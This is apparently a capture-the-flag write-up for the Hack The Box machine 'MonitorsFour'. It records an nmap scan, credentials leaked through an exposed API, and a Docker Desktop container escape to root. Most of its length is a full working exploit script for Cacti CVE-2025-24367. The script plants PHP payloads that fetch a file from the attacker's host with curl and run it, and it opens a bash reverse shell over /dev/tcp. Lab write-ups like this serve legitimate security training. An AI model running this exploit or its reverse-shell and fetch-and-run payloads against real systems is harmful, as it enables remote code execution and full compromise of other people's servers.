![[{B95DB59B-2052-4C5C-A35F-60BF2CD59572}.png]]

# Enumeration

I ran the nmap command
```
sudo nmap -sC -sV -vv -oA monitorsfour monitorsfour.htb
```

Here is the output:
```
# Nmap 7.98 scan initiated Fri Jan 16 03:41:45 2026 as: /usr/lib/nmap/nmap -sC -sV -vv -oA monitorsfour 10.129.74.178
Nmap scan report for 10.129.74.178
Host is up, received echo-reply ttl 127 (0.20s latency).
Scanned at 2026-01-16 03:41:46 EST for 39s
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON          VERSION
80/tcp   open  http    syn-ack ttl 127 nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 16 03:42:25 2026 -- 1 IP address (1 host up) scanned in 39.44 seconds
```

Doing subdomain enumeration, we find a subdomain named `cacti.monitorsfour.htb`, let's keep that for the future

![[Pasted image 20260202120640.png]]

This is what the website looks like
After doing all the basic enumeration, we find an exposed API call in the login page
![[{AF0321CA-9F52-41E8-9029-044646D67627}.png]]

`/api/v1/auth` is an exposed endpoint which we can use to find other users and their credentials
![[Pasted image 20260202120946.png]]

We found the credentials of `Marcus Higgins`, and his password is `wonderful1`, this credential works on the main website and we can login as Marcus.

Lets come to subdomain `cacti.monitorsfour.htb`
![[Pasted image 20260202121259.png]]

We can see its running `Cacti 1.2.28`
We can find an exact CVE POC for it written by `CyberGeek`, the same guy who created this machine
https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC

The CVE states that `An authenticated Cacti user can abuse graph creation and graph template functionality to create arbitrary PHP scripts in the web root of the application, leading to remote code execution on the server.`

here is the exploit code:
```
###########################################################
#                                                         #
# CVE-2025-24367 - Cacti Authenticated Graph Template RCE #
#         Created by TheCyberGeek @ HackTheBox            #
#             For educational purposes only               #    
#                                                         #
###########################################################

import argparse
import requests
import sys
import re
import time
import random
import string
import http.server
import os
import socketserver
import threading
from pathlib import Path
from urllib.parse import quote_plus
from bs4 import BeautifulSoup

SESSION = requests.Session()

"""
Custom HTTP logging class
"""
class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        if args[1] == '200':
            print(f"[+] Got payload: {self.path}")
        else:
            pass

"""
Web server class with start and stop functionalities in working directory
"""
class BackgroundHTTPServer:
    def __init__(self, directory, port=80):
        self.directory = directory
        self.port = port
        self.httpd = None
        self.server_thread = None

    def start(self):
        os.chdir(self.directory)
        handler = CustomHTTPRequestHandler
        self.httpd = socketserver.TCPServer(("", self.port), handler)
        self.server_thread = threading.Thread(target=self.httpd.serve_forever)
        self.server_thread.daemon = True
        self.server_thread.start()
        print(f"[+] Serving HTTP on port {self.port}")

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
            self.server_thread.join()
            print(f"[+] Stopped HTTP server on port {self.port}")

"""
Check if instance is Cacti
"""
def check_cacti(url: str) -> None:
    req = requests.get(url)
    if "Cacti" in req.text:
        print("[+] Cacti Instance Found!")
    else:
        print("[!] No Cacti Instance was found, exiting...")
        exit(1)
    
"""
Log into the Cacti instance
"""
def login(url: str, username: str, password: str, ip: str, port: int, proxy: dict | None) -> None:
    res = SESSION.get(url, proxies=proxy)
    match = re.search(r'var csrfMagicToken\s=\s"(sid:[a-z0-9]+,[a-z0-9]+)', res.text)
    csrf_magic_token = match.group(1)
    data = {
        '__csrf_magic': csrf_magic_token,
        'action': 'login',
        'login_username': username,
        'login_password': password
    }
    req = SESSION.post(url + '/cacti/index.php', data=data, proxies=proxy)
    if 'You are now logged into' in req.text:
        print('[+] Login Successful!')
        return True
    else:
        print('[!] Login Failed :(')
        http_server.stop()
        exit(1)

"""
Write bash payload
"""
def write_payload(ip: str, port: int) -> None:
    with open("bash", "w") as f:
        f.write(f"#!/bin/bash\nbash -i >& /dev/tcp/{ip}/{port} 0>&1")
        f.close()

"""
Get the template ID required for exploitation (Unix - Logged In Users)
"""
def get_template_id(url: str, proxy: dict | None) -> int:
    graph_template_search = SESSION.get(url + '/cacti/graph_templates.php?filter=Unix - Logged in Users&rows=-1&has_graphs=false', proxies=proxy)
    soup = BeautifulSoup(graph_template_search.text, "html.parser")
    elem = soup.find("input", id=re.compile(r"chk_\d+"))

    if elem:
        template_id = int(elem["id"].split("_")[1])
        print(f"[+] Got graph ID: {template_id}")
    else:
        print("[!] Failed to get template ID")
        http_server.stop()
        exit(1)

    return template_id

"""
Trigger the payload in multiple requests
"""
def trigger_payload(url: str, ip: str, stage: str, template_id: int, proxy: dict | None) -> None:    
    # Edit graph template
    graph_template_page = SESSION.get(url + f'/cacti/graph_templates.php?action=template_edit&id={template_id}', proxies=proxy)
    match = re.search(r'var csrfMagicToken\s=\s"(sid:[a-z0-9]+,[a-z0-9]+)', graph_template_page.text)
    csrf_magic_token = match.group(1)

    # Generate random filename
    get_payload_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + ".php"
    trigger_payload_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + ".php"

    # Change payload based on stage
    if stage == "write payload":
        print(f"[i] Created PHP filename: {get_payload_filename}")
        right_axis_label = (
            f"XXX\n"
            f"create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 "
            f"RRA:AVERAGE:0.5:1:1200\n"
            f"graph {get_payload_filename} -s now -a CSV "
            f"DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`curl\\x20{ip}/bash\\x20-o\\x20bash`;?>\n"
        )
    else:
        print(f"[i] Created PHP filename: {trigger_payload_filename}")
        right_axis_label = (
            f"XXX\n"
            f"create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 "
            f"RRA:AVERAGE:0.5:1:1200\n"
            f"graph {trigger_payload_filename} -s now -a CSV "
            f"DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`bash\\x20bash`;?>\n"
        )        

    data = {
        "__csrf_magic": csrf_magic_token,
        "name": "Unix - Logged in Users",
        "graph_template_id": template_id,
        "graph_template_graph_id": template_id,
        "save_component_template": "1",
        "title": "|host_description| - Logged in Users",
        "vertical_label": "percent",
        "image_format_id": "3",
        "height": "200",
        "width": "700",
        "base_value": "1000",
        "slope_mode": "on",
        "auto_scale": "on",
        "auto_scale_opts": "2",
        "auto_scale_rigid": "on",
        "upper_limit": "100",
        "lower_limit": "0",
        "unit_value": "",
        "unit_exponent_value": "",
        "unit_length": "",
        "right_axis": "",
        "right_axis_label": right_axis_label,
        "right_axis_format": "0",
        "right_axis_formatter": "0",
        "left_axis_formatter": "0",
        "auto_padding": "on",
        "tab_width": "30",
        "legend_position": "0",
        "legend_direction": "0",
        "rrdtool_version": "1.7.2",
        "action": "save"
    }

    # Update the template
    get_file = SESSION.post(url + '/cacti/graph_templates.php?header=false', data=data, allow_redirects=True, proxies=proxy)

    # Trigger execution
    trigger_write = SESSION.get(url + f'/cacti/graph_json.php?rra_id=0&local_graph_id=3&graph_start=1761683272&graph_end=1761769672&graph_height=200&graph_width=700')

    # Get payloads
    try:
        if stage == "write payload":
            res = SESSION.get(url + f'/cacti/{get_payload_filename}')
        else:
            res = SESSION.get(url + f'/cacti/{trigger_payload_filename}', timeout=2)
    except requests.Timeout:
        print("[+] Hit timeout, looks good for shell, check your listener!")
        return

    if "File not found" in res.text:
        print("[!] Exploit failed to execute!")
        http_server.stop()
        exit(1)      

"""
Main function to parse args and trigger execution
"""
if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='CVE-2025-24367 - Cacti Authenticated Graph Template RCE')
    parser.add_argument('-u', '--user', type=str, required=True, help='Username for login')
    parser.add_argument('-p', '--password', type=str, required=True, help='Password for login')
    parser.add_argument('-i', '--ip', type=str, required=True, help='IP address for reverse shell')
    parser.add_argument('-l', '--port', type=str, required=True, help='Port number for reverse shell')
    parser.add_argument('-url', '--url', type=str, required=True, help='Base URL of the application')
    parser.add_argument('--proxy', action='store_true', help='Enable proxy usage (default: http://127.0.0.1:8080)')
    args = parser.parse_args()
    proxy = {'http': 'http://127.0.0.1:8080'} if args.proxy else None
    check_cacti(args.url)
    http_server = BackgroundHTTPServer(os.getcwd(), 80)
    http_server.start()  
    login(args.url, args.user, args.password, args.ip, args.port, proxy)
    template_id = get_template_id(args.url, proxy)
    write_payload(args.ip, args.port)
    trigger_payload(args.url, args.ip, "write payload", template_id, proxy)
    trigger_payload(args.url, args.ip, "trigger payload", template_id, proxy)
    http_server.stop()
    Path("bash").unlink(missing_ok=True)
```

The credentials of Marcus can be used in this to drop a reverse shell.
![[{9B0D1784-55F9-4044-8ED3-743F2C05A162}.png]]

# Foothold

We are now inside of a docker container, we have to escalate ourselves to the main target machine
After enumerating the docker version, we find a vulnerability for it named CVE-2025-9074
`A vulnerability was identified in Docker Desktop that allows local running Linux containers to access the Docker Engine API via the configured Docker subnet, at 192.168.65.7:2375 by default. This vulnerability occurs with or without Enhanced Container Isolation (ECI) enabled, and with or without the "Expose daemon on tcp://localhost:2375 without TLS" option enabled. This can lead to execution of a wide range of privileged commands to the engine API, including controlling other containers, creating new ones, managing images etc. In some circumstances (e.g. Docker Desktop for Windows with WSL backend) it also allows mounting the host drive with the same privileges as the user running Docker Desktop.`

I found a blog by the finder of this CVE
https://blog.qwertysecurity.com/Articles/blog3

Since wget is not available inside this docker container, we will be using `curl`

![[{8C7FB65E-3C59-4646-B7F7-5B2459174E5E}.png]]
![[{09C2BE33-1A18-471C-B138-0E750CE640DE}.png]]

I ran these commands and got root shell
The user flag can be found in `/home/marcus` of the first reverse shell, inside the docker container
The root flag of the machine can be found in `/host_root/Users/Administrator/Desktop`
![[{BD1D1FEF-0770-4B96-8104-2EF7A251CDD3}.png]]




